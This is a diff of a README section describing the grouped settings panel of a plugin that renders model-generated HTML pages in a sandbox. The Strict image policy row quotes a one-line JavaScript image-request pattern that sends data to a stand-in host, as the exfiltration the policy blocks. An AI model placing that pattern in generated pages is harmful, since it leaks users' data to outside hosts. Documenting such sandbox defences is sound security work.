@@ -7,27 +7,34 @@ Chinese remodel plan: `docs/REDESIGN-SANDBOX-FIRST.zh-CN.md`.
 
 ## Settings → IUI
 
-| Control | Default | Meaning |
-|---------|---------|---------|
-| Theme | `iui-default` | Neutral sandbox theme tokens / DS kit (legacy pack ids resolve here) |
-| Fence repair feedback | on | Same-turn repair hint when a fence fails to render |
-| Format referee | on | Only when the user explicitly asks for a page (build/show verb + visual artifact) and the reply has none → steer toward ```iui-html |
-| Strict image policy | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
-| Legacy fences (deprecated) | off | Render old ```` ```iui ```` / ```` ```dsh-ui ```` fences. Off: they stay code blocks (a settled page body gets a **▶ Render as page** button) and the referee asks the model for ```` ```iui-html ````. Plain ```` ```svg ```` opens on the source tab unless the root is `<svg data-iui…>`. Removed in 0.14 |
-| Library source | `local` | Where sandbox libraries (Leaflet, Chart.js, three, gsap, mermaid, ag-grid…) load from. `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr (three/gsap ESM via npmmirror). `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 (remembered per browser until this setting changes) |
-| Custom library URL | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{file}`; its origin is allowed in the frame CSP). Invalid templates fall back to `local` order |
-| Library source | `local` | Where sandbox libraries (Leaflet, Chart.js, three, gsap, mermaid, ag-grid…) load from. `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr (three/gsap ESM via npmmirror). `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 (remembered per browser until this setting changes) |
-| Custom library URL | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{file}`; its origin is allowed in the frame CSP). Invalid templates fall back to `local` order |
-| Custom tokens JSON | — | Optional token overrides for sandbox CSS vars |
-| User templates JSON | — | HTML/CSS/JS starters the user saved |
-| Enable Jev router | **off** | TypeSafe System One format pick; **off without key**. Privacy: when on, each user message's text is sent to the third-party TypeSafe service |
-| TypeSafe API key | — | Secret; empty keeps Jev off |
-| TypeSafe base URL / model | defaults | Optional overrides (`jev-latest`) |
-| Structured Outputs | **auto** | Build/advertise json_schema; degrade to soft fence if unsupported |
-| Probe base URL | — | Optional OpenAI-compatible root (e.g. `http://127.0.0.1:3001`) |
-| Probe API key | — | Secret for probe only |
+Groups (top to bottom): **外观 Appearance · 生成 Generation · 网络与资源 Network · 隐私与安全 Privacy · 模板 Templates · 开发者 Developer** (collapsed).
+Appearance and templates apply immediately (saved in this browser and, when the host form is writable, to the config). Everything else is staged and written by **Save**; it applies to new messages. Hosts without the settings-form primitives show an "upgrade dsh" card instead of a broken form.
 
-**Removed in 0.13 (do not expect these controls):** component pack picker, Gateway transport/sidecar, instance-store persist, frames.sse mount, DIL schema endpoints.
+| Group | Control | Field | Default | Meaning |
+|-------|---------|-------|---------|---------|
+| Appearance | Accent / density / text size / corners / colour scheme | `pageStyleJson` | auto | Default look of every ```iui-html page (same controls as ⋯ → 外观). Pushed live to open pages and previewed in two real sandbox pages (light + dark). Scheme `auto` follows the **host** theme (dsh light/dark), not the OS |
+| Generation | Page generation | `uiEagerness` | `balanced` | `restrained`: pages only when asked. `balanced`: explain / compare questions answered in prose with a 「做成可交互页面」 pill. `eager`: visualise whenever it helps |
+| Generation | Auto repair | `fenceFeedback` | on | Same-turn repair when a page fails to render or is cut off. Each repair is one extra model call |
+| Generation | Format correction | `formatReferee` | on | Only when the user explicitly asks for a page and the reply has none → steer toward ```iui-html. Off also stops the short per-page-type hints. Each correction is one extra model call. The group shows how many repairs / corrections ran since the server started |
+| Network | Library source | `cdnPreset` | `local` | Where sandbox libraries (Leaflet, Chart.js, three, gsap, mermaid, ag-grid…) load from. `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr. `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 |
+| Network | Custom library URL | `cdnTemplate` | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{name}` and `{file}`; validated inline, invalid values block Save) |
+| Privacy | Strict image policy | `strictImagePolicy` | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
+| Privacy | Page storage / feedback stats | — | — | Clear per-conversation page state; export (after an explicit consent tick) or clear the local 👍/👎 statistics |
+| Templates | 我的模板 | `userTemplatesJson` | — | Pages saved with ⋯ → 「保存为模板」. Also listed in the template drawer under 「我的模板」 (试用 / 复制 / 删除). Import / export JSON here. Format: `[{"id","name","description?","source"}]`, `source` = the ```iui-html fence body; ≤ 30 templates, ≤ 64 KB each. Legacy `{demo}` catalog entries are skipped with a notice |
+| Developer | Custom CSS tokens | `customTokensJson` | — | `{"--color-text-info":"#0f766e"}`. Checked against the sandbox token catalogue: unknown names are applied but flagged, unsafe values (`;{}<>`, `url()`, comments) are dropped |
+| Developer | Legacy fences (deprecated) | `legacyFences` | off | Render old ```` ```iui ```` / ```` ```dsh-ui ```` fences. Removed in 0.14 |
+| Developer | Raw templates JSON | `userTemplatesJson` | — | Same list as 「模板」, editable as text (applied on Save) |
+| Developer | Jev router (experimental) | `jevEnabled`, `jevApiKey`, `jevBaseUrl`, `jevModel` | off | TypeSafe System One format pick; off without key. **Privacy:** when on, each user message's text is sent to the third-party TypeSafe service (warning shown) |
+| Developer | Structured Outputs + probe | `structuredOutputsMode`, `structuredOutputsProbeUrl`, `structuredOutputsProbeKey` | `auto` | Builds / advertises a json_schema. The current dsh host cannot attach `response_format`, so this does not affect generation (stated in the UI) |
+| (hidden) | Theme | `themeId` | `iui-default` | Single built-in theme; legacy pack ids resolve here. Not shown |
+
+`src/config/settings-fields.ts` is the single list of bound fields; a test keeps it equal to the `Config` schema keys (minus hidden `themeId`).
+
+Debug: start dsh with `IUI_DEBUG=1` to write the IUI system-prompt section to `$TMPDIR/iui-system-section.txt` (never written otherwise).
+
+Runtime config is refreshed when the tab becomes visible / focused, after every Save, and every 60 s while visible (no fixed 2.5 s poll).
+
+**Removed in 0.13 (do not expect these controls):** component pack picker, theme picker, per-group token overrides (`--dsl-g-*`, had no effect on ```iui-html pages), Gateway transport/sidecar, instance-store persist, frames.sse mount, DIL schema endpoints.
 
 Save applies to **new** fences (hard refresh if the client mirror looks stale).
 
